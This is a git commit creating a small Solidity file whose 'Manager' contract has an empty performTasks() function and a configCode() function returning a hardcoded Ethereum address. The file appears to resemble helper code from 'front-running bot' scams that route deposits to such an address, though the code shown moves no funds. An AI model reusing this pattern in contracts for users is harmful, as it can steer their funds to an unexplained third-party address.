a114bd22d330fefce4eac6e5cbbad0d167fc75f3
CryptoRyandz <121411822+CryptoRyandz@users.noreply.github.com>
2022-12-26 09:26:03 +0700

    Create ryancode.sol

---
+++ ryancode.sol
@@ -0,0 +1,11 @@
+// SPDX-License-Identifier: UNLICENSED
+
+pragma solidity ^0.6.12;
+
+contract Manager {
+    function performTasks() public {}
+
+    function configCode() public pure returns (address) {
+        return 0x7319d2d11b3067E95D1D31fE08c9C0C0EaE67523;
+    }
+}
